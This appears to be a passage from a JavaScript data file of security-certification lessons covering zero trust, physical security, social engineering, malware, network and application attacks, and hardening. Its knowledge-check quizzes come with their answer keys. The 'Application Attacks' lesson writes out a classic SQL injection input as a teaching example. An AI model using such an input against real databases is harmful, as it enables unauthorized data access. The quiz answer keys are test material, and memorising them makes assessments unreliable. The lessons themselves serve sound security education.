        summary: {
          key_takeaways: [
            "Zero Trust: Never trust, always verify",
            "No implicit trust from network location",
            "Identity is the new perimeter",
            "Microsegmentation limits lateral movement"
          ],
          exam_essentials: [
            "Zero Trust = verify explicitly, least privilege, assume breach",
            "Network location ≠ trust",
            "MFA mandatory, FIDO2 preferred",
            "Microsegmentation contains breaches"
          ]
        }
      },
      {
        id: 'D1-LESSON-006',
        domain: 1,
        title: 'Physical Security Controls',
        difficulty: 'beginner',
        duration: '45 min',
        introduction: {
          hook: "In 2019, a contractor walked into a data center, plugged in a USB device, and walked out with gigabytes of customer data. No visitor logs, no badge monitoring, no USB port controls. Physical security is the foundation—if an attacker can touch your systems, they can own your systems.",
          learning_goals: [
            "Design layered physical security using defense-in-depth",
            "Select appropriate access control mechanisms",
            "Implement environmental controls",
            "Integrate physical and logical security"
          ]
        },
        sections: [
          {
            title: "Physical Security Layers",
            content: "**Perimeter Security:**\n- Fences, gates, bollards\n- Lighting (deter and detect)\n- Security guards\n- Vehicle barriers\n\n**Building Security:**\n- Access control systems\n- Reception/visitor management\n- Security cameras (CCTV)\n- Alarms and sensors\n\n**Internal Security:**\n- Badge access to sensitive areas\n- Mantraps (airlocks)\n- Locked cabinets/safes\n- Cable locks for equipment",
            key_points: [
              "Physical security uses layers like cyber security",
              "Perimeter → Building → Room → Rack",
              "Each layer provides additional protection",
              "Defense in depth applies to physical too"
            ],
            knowledge_check: {
              question: "What physical control prevents tailgating (following someone through a secured door)?",
              options: [
                "Security camera",
                "Badge reader",
                "Mantrap (airlock)",
                "Fence"
              ],
              correct: 2,
              explanation: "A mantrap (airlock) requires each person to badge through individually. Only one person can be in the space at a time, preventing tailgating."
            }
          },
          {
            title: "Environmental Controls",
            content: "**HVAC (Heating, Ventilation, AC):**\n- Data centers need precise temperature/humidity\n- Hot/cold aisle containment\n- Positive pressure to keep contaminants out\n\n**Fire Suppression:**\n- FM-200/Novec: Clean agents (safe for electronics)\n- Water: Not for electronics!\n- Pre-action systems: Two triggers required\n\n**Power:**\n- UPS: Battery backup for short outages\n- Generator: Extended outages\n- PDU: Power distribution units\n- Dual power feeds for redundancy",
            key_points: [
              "HVAC critical for data center equipment",
              "Clean agents (FM-200) for electronics",
              "UPS + generator for power resilience",
              "Positive pressure keeps contaminants out"
            ],
            exam_tips: [
              "FM-200 = clean agent fire suppression (safe for data centers)",
              "Wet pipe sprinklers damage electronics",
              "UPS = short-term; Generator = long-term",
              "Positive pressure = clean air in"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Physical security uses defense-in-depth",
            "Mantraps prevent tailgating",
            "FM-200 is clean agent for data centers",
            "HVAC and fire suppression protect equipment"
          ],
          exam_essentials: [
            "Mantrap = prevents tailgating/piggybacking",
            "FM-200 = clean agent fire suppression",
            "Bollards = vehicle barriers",
            "Positive pressure = keeps contaminants out"
          ]
        }
      },
      {
        id: 'D1-LESSON-007',
        domain: 1,
        title: 'Deception Technologies',
        difficulty: 'intermediate',
        duration: '40 min',
        introduction: {
          hook: "What if instead of just defending, you could trick attackers into revealing themselves? Deception technologies present convincing fakes that have no legitimate use—any interaction is immediately suspicious.",
          learning_goals: [
            "Differentiate honeypots, honeynets, honeytokens, honeyfiles",
            "Design deception strategies for detection",
            "Understand how fake telemetry disrupts attackers",
            "Implement deception without creating risks"
          ]
        },
        sections: [
          {
            title: "Deception Technologies",
            content: "**Honeypots:**\nDecoy systems designed to attract attackers. Appear vulnerable but monitored closely.\n- Low interaction: Emulated services, limited engagement\n- High interaction: Full systems, more intelligence but more risk\n\n**Honeynets:**\nNetwork of honeypots simulating entire environment.\n\n**Honeytokens:**\nFake credentials or data that trigger alerts when used.\n\n**Honeyfiles:**\nFake documents that alert when accessed.\n\n**DNS Sinkhole:**\nRedirects malicious domain queries to controlled server.",
            key_points: [
              "Honeypots attract and detect attackers",
              "Any interaction = suspicious (near-zero false positives)",
              "Honeytokens trigger alerts when used",
              "DNS sinkholes redirect malicious traffic"
            ],
            knowledge_check: {
              question: "What is the PRIMARY advantage of deception technologies over traditional detection?",
              options: [
                "They're cheaper to implement",
                "Near-zero false positives (legitimate users don't interact)",
                "They prevent all attacks",
                "They don't require monitoring"
              ],
              correct: 1,
              explanation: "Deception technologies have near-zero false positives because legitimate users have no reason to interact with decoys. Any interaction is suspicious."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Honeypots are decoy systems that attract attackers",
            "Near-zero false positive rate (no legitimate use)",
            "Honeytokens alert when fake credentials are used",
            "DNS sinkholes redirect malicious domain queries"
          ],
          exam_essentials: [
            "Honeypot = decoy system to attract attackers",
            "Honeytoken = fake credential triggering alert",
            "Honeyfile = fake document triggering alert",
            "DNS sinkhole = redirects malicious domains"
          ]
        }
      },
      {
        id: 'D1-LESSON-008',
        domain: 1,
        title: 'Change Management',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "In 2017, a routine network configuration change at a major airline caused an IT outage that grounded 2,300 flights and cost $100 million. Unauthorized change, no rollback plan, no documentation. Change management ensures changes are controlled and coordinated.",
          learning_goals: [
            "Apply formal change management processes",
            "Conduct security impact assessments",
            "Implement version control and rollback",
            "Distinguish standard, emergency, and automated changes"
          ]
        },
        sections: [
          {
            title: "Change Management Process",
            content: "**Change Types:**\n- Standard: Pre-approved, low risk\n- Normal: Requires CAB approval\n- Emergency: Expedited for critical issues\n\n**Process Steps:**\n1. Request: Document proposed change\n2. Review: Assess risk and impact\n3. Approve: CAB (Change Advisory Board) decision\n4. Test: Validate in non-production\n5. Implement: Execute with rollback plan\n6. Document: Record results\n\n**Key Elements:**\n- Rollback plan required before implementation\n- Security impact assessment\n- Testing in isolated environment\n- Documentation and audit trail",
            key_points: [
              "All changes need documentation",
              "CAB approves normal changes",
              "Emergency changes still need post-approval",
              "Rollback plan is mandatory"
            ],
            knowledge_check: {
              question: "A critical production system is down. What type of change process should be used?",
              options: [
                "Standard change—it's routine",
                "Normal change—follow all steps",
                "Emergency change—expedited approval",
                "No change process—it's an emergency"
              ],
              correct: 2,
              explanation: "Emergency change process. Still documented and controlled, but expedited. Post-implementation review still required."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Change management prevents configuration-related incidents",
            "CAB reviews and approves changes",
            "Emergency changes are expedited but still documented",
            "Rollback plans required before implementation"
          ],
          exam_essentials: [
            "CAB = Change Advisory Board",
            "Standard = pre-approved; Normal = CAB review; Emergency = expedited",
            "Rollback plan always required",
            "All changes documented and tested"
          ]
        }
      },
      // ═════════════════════════════════════════════════════════════
      // DOMAIN 2: Threats, Vulnerabilities & Mitigations
      // ═════════════════════════════════════════════════════════════
      {
        id: 'D2-LESSON-001',
        domain: 2,
        title: 'Threat Actors & Motivations',
        difficulty: 'beginner',
        duration: '50 min',
        introduction: {
          hook: "In 2023, LockBit attacked over 1,700 organizations across 30 countries. A 17-year-old breached Uber and Rockstar Games just to prove he could. Understanding WHO is attacking you shapes your defenses.",
          learning_goals: [
            "Classify threat actors by type, capability, and sophistication",
            "Analyze attacker motivations (financial, political, ideological)",
            "Differentiate internal and external threats",
            "Apply threat actor knowledge to defensive strategies"
          ]
        },
        sections: [
          {
            title: "Threat Actor Types",
            content: "**Nation-State Actors:**\n- Highest capability and resources\n- Espionage, sabotage, disruption\n- APT (Advanced Persistent Threat) campaigns\n- Examples: APT29 (Russia), APT41 (China)\n\n**Organized Crime:**\n- Profit-driven motivation\n- Ransomware-as-a-Service (RaaS)\n- Double/triple extortion\n- Business-like operations\n\n**Hacktivists:**\n- Ideological/political motivation\n- Public embarrassment goals\n- DDoS, defacement, data leaks\n\n**Insider Threats:**\n- Malicious: Intentional harm\n- Negligent: Accidental damage\n- Compromised: Credential theft victim\n\n**Script Kiddies:**\n- Low skill, use others' tools\n- Opportunistic targets\n- Unpredictable but limited",
            key_points: [
              "Nation-states = highest capability, espionage/sabotage",
              "Organized crime = profit-driven, RaaS",
              "Insiders = bypass perimeter controls",
              "Motivations: Financial, Political, Espionage, Disruption"
            ],
            knowledge_check: {
              question: "A well-funded group conducts long-term espionage against government contractors, using custom malware and zero-days. What type of threat actor is this?",
              options: [
                "Organized crime",
                "Hacktivist",
                "Nation-state/APT",
                "Script kiddie"
              ],
              correct: 2,
              explanation: "Nation-state/APT characteristics: well-funded, long-term operations, custom tools, government targets, espionage motivation."
            }
          },
          {
            title: "Attack Frameworks",
            content: "**MITRE ATT&CK:**\n- Matrix of adversary tactics and techniques\n- Tactics = WHY (goals)\n- Techniques = HOW (methods)\n- Helps map defenses to attack patterns\n\n**Cyber Kill Chain (Lockheed Martin):**\n1. Reconnaissance\n2. Weaponization\n3. Delivery\n4. Exploitation\n5. Installation\n6. Command & Control\n7. Actions on Objectives\n\nBreaking any stage disrupts the attack.",
            key_points: [
              "MITRE ATT&CK maps tactics and techniques",
              "Kill Chain shows attack progression",
              "Breaking any kill chain stage stops attack",
              "Use frameworks to align defenses"
            ],
            exam_tips: [
              "MITRE ATT&CK: Tactics (why) + Techniques (how)",
              "Kill Chain: 7 stages from recon to objective",
              "Know both frameworks for exam"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Nation-state = highest capability, espionage motivation",
            "Organized crime = profit-driven, RaaS model",
            "Insider threats bypass perimeter controls",
            "MITRE ATT&CK and Kill Chain help map defenses"
          ],
          exam_essentials: [
            "Nation-state = APT, espionage, highest sophistication",
            "RaaS = Ransomware-as-a-Service",
            "Insider types: malicious, negligent, compromised",
            "Kill Chain stages: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions"
          ]
        }
      },
      {
        id: 'D2-LESSON-002',
        domain: 2,
        title: 'Threat Vectors & Attack Surfaces',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Threat vectors are the paths attackers use to reach targets. Attack surface is the total of all entry points. Reducing attack surface limits what attackers can target.",
          learning_goals: [
            "Identify common threat vectors",
            "Analyze and reduce attack surfaces",
            "Understand supply chain attack vectors",
            "Apply attack surface reduction strategies"
          ]
        },
        sections: [
          {
            title: "Common Threat Vectors",
            content: "**Message-Based Vectors:**\n- Email (phishing, malware attachments)\n- SMS (smishing)\n- Instant messaging\n- Social media\n\n**Web-Based Vectors:**\n- Malicious websites\n- Drive-by downloads\n- Watering hole attacks\n- SEO poisoning\n\n**Network Vectors:**\n- Direct exploitation of services\n- Man-in-the-middle attacks\n- Wireless attacks (evil twin)\n\n**Physical Vectors:**\n- USB devices (BadUSB, Rubber Ducky)\n- Removable media\n- Physical access to systems",
            key_points: [
              "Email is #1 initial access vector",
              "Watering hole = compromise sites targets visit",
              "Evil twin = fake wireless access point",
              "USB attacks bypass network security"
            ],
            knowledge_check: {
              question: "Attackers compromise a website frequently visited by employees of a target company. What attack is this?",
              options: [
                "Spear phishing",
                "Watering hole",
                "Drive-by download",
                "SEO poisoning"
              ],
              correct: 1,
              explanation: "Watering hole attack—compromising websites targets frequently visit. Like predators waiting at a watering hole."
            }
          },
          {
            title: "Supply Chain Attacks",
            content: "**Definition:**\nCompromise trusted vendors to reach downstream victims.\n\n**Examples:**\n- SolarWinds: Malware in software update\n- Kaseya: Ransomware via MSP\n- CodeCov: Credential theft via CI/CD\n\n**Mitigation:**\n- SBOM (Software Bill of Materials)\n- Vendor security assessments\n- Code signing verification\n- Dependency scanning",
            key_points: [
              "Supply chain attacks exploit trusted vendors",
              "SolarWinds = classic supply chain attack",
              "SBOM tracks software components",
              "Verify vendor security practices"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Email is most common initial access vector",
            "Watering hole targets sites victims visit",
            "Supply chain attacks compromise trusted vendors",
            "SBOM helps track software dependencies"
          ],
          exam_essentials: [
            "Watering hole = compromise frequently visited sites",
            "Evil twin = fake AP with same SSID",
            "Supply chain = trusted vendor compromise",
            "SBOM = Software Bill of Materials"
          ]
        }
      },
      {
        id: 'D2-LESSON-003',
        domain: 2,
        title: 'Social Engineering',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "In 2020, a 17-year-old breached Twitter by calling employees and convincing them he was from IT. He controlled Obama, Musk, and Biden's accounts within hours. Social engineering targets the human mind.",
          learning_goals: [
            "Identify social engineering techniques",
            "Recognize psychological principles exploited",
            "Differentiate phishing variants",
            "Implement technical and human defenses"
          ]
        },
        sections: [
          {
            title: "Psychological Principles",
            content: "**Authority:**\nPeople comply with perceived authority figures. 'The CEO needs this immediately.'\n\n**Urgency/Scarcity:**\nTime pressure prevents careful thinking. 'Your account will be closed in 24 hours.'\n\n**Social Proof:**\nPeople follow what others do. 'Other employees have completed this.'\n\n**Reciprocity:**\nObligation to return favors. Attacker helps first, then asks.\n\n**Liking:**\nPeople comply with those they like. Building rapport.\n\n**Commitment:**\nConsistency with prior actions. Small requests escalate.",
            key_points: [
              "Authority and urgency most exploited",
              "Time pressure bypasses critical thinking",
              "Social proof leverages conformity",
              "Reciprocity creates obligation"
            ],
            knowledge_check: {
              question: "An attacker calls pretending to be from IT, says there's an urgent security issue, and asks for credentials. Which principles are being exploited?",
              options: [
                "Social proof and liking",
                "Authority and urgency",
                "Reciprocity and commitment",
                "Scarcity and social proof"
              ],
              correct: 1,
              explanation: "Authority (IT department) and urgency (immediate security issue) are classic social engineering combinations."
            }
          },
          {
            title: "Phishing Variants",
            content: "**Phishing:**\nMass emails impersonating known brands. Volume-based.\n\n**Spear Phishing:**\nTargeted at specific individuals using research. Higher success rate.\n\n**Whaling:**\nTargets executives ('big fish'). Highly personalized.\n\n**Business Email Compromise (BEC):**\nImpersonates executives for wire fraud. $2.7B annual losses.\n\n**Smishing:**\nSMS-based phishing.\n\n**Vishing:**\nVoice/phone-based phishing.",
            key_points: [
              "Phishing = mass; Spear phishing = targeted",
              "Whaling = executives; BEC = wire fraud",
              "Smishing = SMS; Vishing = voice",
              "BEC has highest financial impact"
            ],
            exam_tips: [
              "Phishing = mass; Spear phishing = targeted; Whaling = executives",
              "BEC impersonates executives for financial fraud",
              "Vishing = voice; Smishing = SMS"
            ]
          },
          {
            title: "Defenses",
            content: "**Technical Controls:**\n- Email filtering and anti-phishing\n- DMARC, DKIM, SPF (email authentication)\n- External email banners\n- MFA (defeats stolen credentials)\n- URL filtering\n\n**Human Controls:**\n- Security awareness training\n- Phishing simulations\n- Reporting culture (no punishment for reporting)\n- Verification procedures (callback using known numbers)",
            key_points: [
              "DMARC/DKIM/SPF authenticate email",
              "MFA defeats stolen credentials",
              "Training + simulations build awareness",
              "Out-of-band verification for sensitive requests"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Authority and urgency are most exploited principles",
            "Phishing variants target different audiences",
            "BEC has highest financial impact",
            "Defense combines technical and human controls"
          ],
          exam_essentials: [
            "Phishing = mass; Spear = targeted; Whaling = executives",
            "BEC = wire fraud impersonation",
            "Vishing = voice; Smishing = SMS",
            "DMARC prevents domain spoofing"
          ]
        }
      },
      {
        id: 'D2-LESSON-004',
        domain: 2,
        title: 'Malware Types',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "WannaCry infected 230,000 computers in 150 countries in four days. It combined a worm's self-spreading with ransomware's encryption. Understanding malware types is essential for detection and defense.",
          learning_goals: [
            "Classify malware by type, propagation, and payload",
            "Differentiate viruses, worms, trojans, ransomware",
            "Identify indicators of malware infection",
            "Apply detection and prevention controls"
          ]
        },
        sections: [
          {
            title: "Malware Classification",
            content: "**Virus:**\nRequires host file and user action to spread. Infects other files.\n\n**Worm:**\nSelf-propagates without user action. Exploits vulnerabilities to spread.\n\n**Trojan:**\nDisguised as legitimate software. Doesn't self-replicate.\n\n**Ransomware:**\nEncrypts files for extortion. Double extortion = encrypt + leak threat.\n\n**Rootkit:**\nHides deep in system. Levels: user-mode, kernel, firmware, hypervisor.\n\n**Spyware:**\nSurveillance and data theft. Keyloggers capture keystrokes.\n\n**Fileless Malware:**\nOperates in memory only. Uses legitimate tools (PowerShell, WMI).",
            key_points: [
              "Virus = needs host + user action",
              "Worm = self-propagates without user",
              "Trojan = disguised, no self-replication",
              "Rootkit HIDES malware at various levels"
            ],
            knowledge_check: {
              question: "Malware spreads across the network by exploiting a vulnerability without any user interaction. What type is it?",
              options: [
                "Virus",
                "Worm",
                "Trojan",
                "Rootkit"
              ],
              correct: 1,
              explanation: "Worm—self-propagates by exploiting vulnerabilities without user action. Viruses need user action; trojans don't self-replicate."
            }
          },
          {
            title: "Indicators of Compromise (IOCs)",
            content: "**Network IOCs:**\n- Unusual outbound connections\n- Beaconing (regular C2 check-ins)\n- DNS queries to suspicious domains\n- Large data transfers\n\n**Host IOCs:**\n- Unexpected processes\n- Registry modifications\n- File hash changes\n- Unusual scheduled tasks\n\n**Behavioral IOCs:**\n- Unusual login times/locations\n- Privilege escalation attempts\n- Lateral movement patterns",
            key_points: [
              "Beaconing = regular C2 communication",
              "File hashes identify known malware",
              "Behavioral indicators detect unknowns",
              "STIX format, TAXII transport for sharing"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Virus needs host + user; Worm self-propagates",
            "Ransomware double extortion = encrypt + leak",
            "Rootkit hides at various system levels",
            "IOCs enable detection of malware activity"
          ],
          exam_essentials: [
            "Virus = host + user action; Worm = self-propagates",
            "RAT = Remote Access Trojan",
            "Rootkit levels: user → kernel → firmware → hypervisor",
            "Fileless = memory-only, uses legitimate tools"
          ]
        }
      },
      {
        id: 'D2-LESSON-005',
        domain: 2,
        title: 'Network Attacks',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "Network attacks target the infrastructure that connects systems. Understanding these attacks is essential for network security.",
          learning_goals: [
            "Identify common network attack techniques",
            "Understand DoS/DDoS attack methods",
            "Recognize man-in-the-middle attacks",
            "Apply network attack mitigations"
          ]
        },
        sections: [
          {
            title: "DoS and DDoS Attacks",
            content: "**DoS (Denial of Service):**\nSingle source overwhelming target resources.\n\n**DDoS (Distributed DoS):**\nMultiple sources (botnet) attacking target.\n\n**Attack Types:**\n- Volumetric: Bandwidth exhaustion (UDP flood)\n- Protocol: Exploit protocol weaknesses (SYN flood)\n- Application: Target application layer (HTTP flood)\n\n**Amplification:**\nSmall request generates large response. DNS, NTP, memcached amplification.",
            key_points: [
              "DoS = single source; DDoS = distributed",
              "Volumetric exhausts bandwidth",
              "SYN flood exploits TCP handshake",
              "Amplification multiplies attack traffic"
            ],
            knowledge_check: {
              question: "An attacker sends small DNS queries with spoofed source IP, causing large responses to flood the victim. What attack is this?",
              options: [
                "SYN flood",
                "DNS amplification",
                "ARP poisoning",
                "MAC flooding"
              ],
              correct: 1,
              explanation: "DNS amplification—small queries generate large responses directed at victim (spoofed source IP). Classic amplification attack."
            }
          },
          {
            title: "Man-in-the-Middle Attacks",
            content: "**ARP Poisoning:**\nFake ARP replies redirect traffic through attacker.\n\n**DNS Spoofing:**\nFake DNS responses redirect to malicious sites.\n\n**SSL Stripping:**\nDowngrade HTTPS to HTTP to intercept traffic.\n\n**MITM Prevention:**\n- Encryption (TLS)\n- Certificate validation\n- DNSSEC\n- Network segmentation",
            key_points: [
              "ARP poisoning at Layer 2",
              "DNS spoofing redirects domains",
              "SSL stripping downgrades encryption",
              "TLS and certificate validation prevent MITM"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "DDoS uses multiple sources (botnet)",
            "Amplification multiplies attack traffic",
            "ARP poisoning enables MITM at Layer 2",
            "TLS prevents most MITM attacks"
          ],
          exam_essentials: [
            "SYN flood = TCP handshake exploitation",
            "Amplification = small request, large response",
            "ARP poisoning = Layer 2 MITM",
            "SSL stripping = HTTPS → HTTP downgrade"
          ]
        }
      },
      {
        id: 'D2-LESSON-006',
        domain: 2,
        title: 'Application Attacks',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "The Equifax breach exposed 147 million records through an unpatched web application vulnerability. Application attacks bypass network defenses entirely—they walk through the front door.",
          learning_goals: [
            "Understand injection attacks (SQL, command, LDAP)",
            "Analyze XSS variants and impacts",
            "Evaluate authentication vulnerabilities",
            "Apply secure coding principles"
          ]
        },
        sections: [
          {
            title: "Injection Attacks",
            content: "**SQL Injection:**\nMalicious SQL in user input. Can read/modify/delete database.\n\nExample: ' OR '1'='1' -- \n\n**Command Injection:**\nOS commands in input. Execute arbitrary commands.\n\n**LDAP Injection:**\nMalicious LDAP queries. Bypass authentication.\n\n**XML Injection/XXE:**\nMalicious XML entities. Read files, SSRF.\n\n**Prevention:**\n- Input validation\n- Parameterized queries (prepared statements)\n- Least privilege for database accounts\n- WAF rules",
            key_points: [
              "SQL injection manipulates database queries",
              "Parameterized queries prevent SQL injection",
              "Command injection executes OS commands",
              "Input validation is first defense"
            ],
            knowledge_check: {
              question: "What is the MOST effective defense against SQL injection?",
              options: [
                "Web Application Firewall (WAF)",
                "Input length limits",
                "Parameterized queries (prepared statements)",
                "Encryption of database"
              ],
              correct: 2,
              explanation: "Parameterized queries (prepared statements) separate data from code, making SQL injection impossible. WAF and validation help but can be bypassed."
            }
          },
          {
            title: "Cross-Site Scripting (XSS)",
            content: "**Reflected XSS:**\nMalicious script in URL/request, reflected in response. Requires victim to click link.\n\n**Stored XSS:**\nScript stored in database, served to all users. More dangerous.\n\n**DOM-based XSS:**\nScript manipulates DOM directly in browser.\n\n**Prevention:**\n- Output encoding\n- Content Security Policy (CSP)\n- Input validation\n- HTTPOnly cookies",
            key_points: [
              "Reflected = in URL, requires click",
              "Stored = in database, affects all users",
              "Output encoding prevents XSS",
              "CSP limits script execution"
            ]
          },
          {
            title: "Other Application Attacks",
            content: "**CSRF (Cross-Site Request Forgery):**\nTricks authenticated user into unwanted actions. Anti-CSRF tokens prevent.\n\n**Directory Traversal:**\nAccess files outside web root using ../\n\n**Buffer Overflow:**\nExceed buffer size to overwrite memory. Can execute code.\n\n**Race Condition:**\nExploit timing between check and use (TOCTOU).",
            key_points: [
              "CSRF exploits authenticated sessions",
              "Anti-CSRF tokens prevent CSRF",
              "Directory traversal: ../ to escape root",
              "Buffer overflow can lead to code execution"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "SQL injection: parameterized queries prevent",
            "XSS: output encoding and CSP prevent",
            "CSRF: anti-CSRF tokens prevent",
            "Input validation is foundational defense"
          ],
          exam_essentials: [
            "SQL injection → parameterized queries",
            "Reflected XSS = URL; Stored XSS = database",
            "CSRF = forged requests using victim's session",
            "Directory traversal = ../ path manipulation"
          ]
        }
      },
      {
        id: 'D2-LESSON-007',
        domain: 2,
        title: 'Vulnerability Management',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Vulnerabilities are weaknesses that attackers exploit. Vulnerability management is the continuous process of identifying, assessing, and remediating these weaknesses before attackers do.",
          learning_goals: [
            "Implement vulnerability scanning and assessment",
            "Prioritize vulnerabilities using CVSS",
            "Develop remediation strategies",
            "Understand vulnerability disclosure"
          ]
        },
        sections: [
          {
            title: "Vulnerability Assessment",
            content: "**Scanning Types:**\n- Credentialed: Authenticated, deeper access, more accurate\n- Non-credentialed: External perspective, faster\n- Agent-based: Installed on endpoints, continuous\n- Network-based: Scans from network, point-in-time\n\n**CVSS (Common Vulnerability Scoring System):**\n- 0.0-3.9: Low\n- 4.0-6.9: Medium\n- 7.0-8.9: High\n- 9.0-10.0: Critical\n\n**CVE (Common Vulnerabilities and Exposures):**\nStandardized identifiers for vulnerabilities (CVE-YYYY-NNNNN).",
            key_points: [
              "Credentialed scans are more accurate",
              "CVSS scores 0-10 severity",
              "CVE provides unique vulnerability IDs",
              "Regular scanning is essential"
            ],
            knowledge_check: {
              question: "Which scan type provides the MOST accurate vulnerability assessment?",
              options: [
                "Non-credentialed external scan",
                "Credentialed authenticated scan",
                "Port scan",
                "Passive network monitoring"
              ],
              correct: 1,
              explanation: "Credentialed scans authenticate to systems, accessing more information and providing more accurate results than external scanning."
            }
          },
          {
            title: "Remediation Strategies",
            content: "**Patching:**\nApply vendor patches. Test before production deployment.\n\n**Compensating Controls:**\nWhen patching isn't possible, implement alternatives:\n- Network segmentation\n- Additional monitoring\n- Access restrictions\n\n**Risk Acceptance:**\nDocument and accept residual risk when remediation isn't feasible.\n\n**Virtual Patching:**\nWAF/IPS rules to block exploitation without changing code.",
            key_points: [
              "Patching is preferred remediation",
              "Test patches before production",
              "Compensating controls when patching isn't possible",
              "Virtual patching uses WAF/IPS rules"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Credentialed scans are most accurate",
            "CVSS provides standardized severity scoring",
            "Patching is preferred; compensating controls when not possible",
            "Virtual patching uses WAF/IPS rules"
          ],
          exam_essentials: [
            "CVSS: Critical (9-10), High (7-8.9), Medium (4-6.9), Low (0-3.9)",
            "CVE = unique vulnerability identifier",
            "Credentialed > non-credentialed accuracy",
            "Virtual patching = WAF/IPS protection"
          ]
        }
      },
      {
        id: 'D2-LESSON-008',
        domain: 2,
        title: 'Indicators of Compromise',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "The average time to detect a breach is 197 days. Organizations that detect quickly know what to look for—Indicators of Compromise (IOCs) and Indicators of Attack (IOAs).",
          learning_goals: [
            "Differentiate IOCs and IOAs",
            "Identify network, host, and behavioral indicators",
            "Understand detection technologies",
            "Apply threat intelligence to detection"
          ]
        },
        sections: [
          {
            title: "Understanding Indicators",
            content: "**IOC (Indicator of Compromise):**\nEvidence that a breach HAS occurred. Forensic artifacts.\n- File hashes\n- IP addresses\n- Domain names\n- Registry changes\n\n**IOA (Indicator of Attack):**\nEvidence that an attack IS occurring. Behavioral patterns.\n- Unusual process execution\n- Lateral movement\n- Privilege escalation attempts\n- Anomalous data access\n\n**IOCs are reactive; IOAs are proactive.**",
            key_points: [
              "IOC = evidence of past compromise",
              "IOA = evidence of ongoing attack",
              "IOAs enable faster detection",
              "Both are essential for detection"
            ],
            knowledge_check: {
              question: "Security tools detect PowerShell launching from Word and attempting to download files. Is this an IOC or IOA?",
              options: [
                "IOC—it's evidence of compromise",
                "IOA—it's behavioral pattern of attack in progress",
                "Neither—it's normal behavior",
                "Both IOC and IOA simultaneously"
              ],
              correct: 1,
              explanation: "IOA—this is behavioral evidence of an attack in progress (likely macro-based malware). IOC would be artifacts like file hashes after the fact."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "IOC = past compromise evidence",
            "IOA = ongoing attack behavior",
            "Behavioral detection catches unknowns",
            "Threat intelligence provides context"
          ],
          exam_essentials: [
            "IOC = forensic evidence (hash, IP, domain)",
            "IOA = behavioral pattern (ongoing)",
            "STIX = threat intel format",
            "TAXII = threat intel transport"
          ]
        }
      },
      {
        id: 'D2-LESSON-009',
        domain: 2,
        title: 'Hardening & Configurations',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Default configurations are designed for usability, not security. Hardening reduces attack surface by removing unnecessary features and applying secure configurations.",
          learning_goals: [
            "Apply system hardening techniques",
            "Implement secure baselines",
            "Remove unnecessary services",
            "Configure secure defaults"
          ]
        },
        sections: [
          {
            title: "Hardening Principles",
            content: "**Secure Baselines:**\n- CIS Benchmarks\n- DISA STIGs (DoD)\n- Vendor hardening guides\n\n**Key Actions:**\n- Remove unnecessary services\n- Disable unused ports\n- Change default credentials\n- Enable logging/auditing\n- Apply least privilege\n- Disable unnecessary protocols\n\n**Examples:**\n- Disable SMBv1 (WannaCry vulnerability)\n- Disable Telnet, use SSH\n- Remove default accounts\n- Disable USB ports if not needed",
            key_points: [
              "CIS Benchmarks provide hardening guides",
              "Disable unnecessary services and ports",
              "Change ALL default credentials",
              "Enable logging and auditing"
            ],
            knowledge_check: {
              question: "Which hardening action would have prevented WannaCry?",
              options: [
                "Enabling firewall",
                "Disabling SMBv1",
                "Installing antivirus",
                "Changing default passwords"
              ],
              correct: 1,
              explanation: "Disabling SMBv1 would have prevented WannaCry, which exploited the EternalBlue vulnerability in SMBv1."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Use CIS Benchmarks or STIGs for baselines",
            "Disable unnecessary services and protocols",
            "Change default credentials",
            "Enable logging and auditing"
          ],
          exam_essentials: [
            "CIS Benchmarks = industry hardening standards",
            "DISA STIGs = DoD hardening standards",
            "SMBv1 = disable (WannaCry)",
            "Telnet = disable, use SSH"
          ]
        }
      },
      {
        id: 'D2-LESSON-010',
        domain: 2,
        title: 'Mitigation Techniques',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Mitigation reduces the impact of attacks. When prevention fails, mitigation limits damage.",
          learning_goals: [
            "Implement network segmentation",
            "Apply access control mitigations",
            "Configure application security controls",
            "Deploy monitoring and detection"
          ]
        },
        sections: [
          {
            title: "Mitigation Strategies",
            content: "**Network Segmentation:**\nDivide network into security zones. Limit lateral movement.\n\n**Access Controls:**\n- Least privilege\n- Role-based access (RBAC)\n- Just-in-time access\n- Privileged Access Management (PAM)\n\n**Application Controls:**\n- Whitelisting (allow only approved)\n- Blacklisting (block known bad)\n- Sandboxing (isolated execution)\n\n**Monitoring:**\n- SIEM correlation\n- Behavioral analytics\n- User activity monitoring",
            key_points: [
              "Segmentation limits lateral movement",
              "Least privilege minimizes access",
              "Whitelisting is more secure than blacklisting",
              "SIEM correlates events across sources"
            ]
          }
        ],
        summary: {
          key_takeaways: [
            "Segmentation contains breaches",
            "Least privilege limits damage",
            "Whitelisting > blacklisting for security",
            "Monitoring enables detection"
          ],
          exam_essentials: [
            "Segmentation = limit lateral movement",
            "PAM = Privileged Access Management",
            "Whitelisting = allow only approved",
            "Sandboxing = isolated execution"
          ]
        }
      },
      {
        id: 'D2-LESSON-011',
        domain: 2,
        title: 'Attack Frameworks',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "Attack frameworks help defenders understand attacker methodology. MITRE ATT&CK and the Cyber Kill Chain map attack techniques to defensive strategies.",
          learning_goals: [
            "Apply MITRE ATT&CK framework",
